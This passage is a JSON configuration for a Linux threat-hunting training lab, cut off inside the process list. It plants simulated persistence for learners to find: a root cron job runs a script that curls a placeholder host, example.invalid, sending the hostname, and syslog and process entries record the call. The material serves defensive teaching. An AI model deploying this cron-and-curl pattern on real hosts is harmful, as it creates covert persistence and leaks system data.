    {
      "id": "soc-lab-linux-persistence-hunt",
      "version": "1.0.0",
      "title": "Hunt for Linux persistence",
      "labType": "threat-hunting",
      "category": "Threat hunting",
      "difficulty": "advanced",
      "estimatedMinutes": 55,
      "prerequisites": ["linux-processes", "linux-logs", "ioc-analysis"],
      "linkedSkills": ["linux-processes", "linux-logs", "ioc-analysis", "siem-query-reasoning"],
      "objectives": [
        { "id": "form-hypothesis", "title": "Form a persistence hypothesis", "required": true, "stage": 1 },
        { "id": "hunt-artifacts", "title": "Search persistence artifacts", "required": true, "stage": 2 },
        { "id": "correlate-hunt", "title": "Correlate process and network evidence", "required": true, "stage": 3 },
        { "id": "report-hunt", "title": "Report supported findings", "required": true, "stage": 4 }
      ],
      "scenario": "An analyst suspects a fictional Linux host has persistence. Hunt cron, service, process, and connection evidence without a provided step sequence.",
      "learnerInstructions": ["State a hypothesis.", "Search the virtual filesystem and runtime datasets.", "Submit an IOC and a report with alternatives."],
      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "ps", "netstat", "ss", "journalctl", "tail", "head"],
      "virtualEnvironment": {
        "cwd": "/home/analyst",
        "files": [
          { "path": "/etc/cron.d/system-update", "content": "*/5 * * * * root /usr/local/bin/system-update", "mode": "0644", "owner": "root", "group": "root" },
          { "path": "/usr/local/bin/system-update", "content": "#!/bin/sh\ncurl -s https://updates.example.invalid/ping?id=$(hostname)", "mode": "0755", "owner": "root", "group": "root" },
          { "path": "/var/log/syslog", "content": "Jul 30 12:00:01 hunt01 CRON[3100]: (root) CMD (/usr/local/bin/system-update)\nJul 30 12:00:02 hunt01 system-update[3101]: contacted 203.0.113.99:443", "mode": "0640", "owner": "root", "group": "adm" }
        ],
        "processes": [
          { "pid": 3101, "user": "root", "command": "/bin/sh /usr/local/bin/system-update" },
          { "pid": 3102, "user": "root", "command": "curl -s https://updates.example.invalid/ping?id=hunt01" }
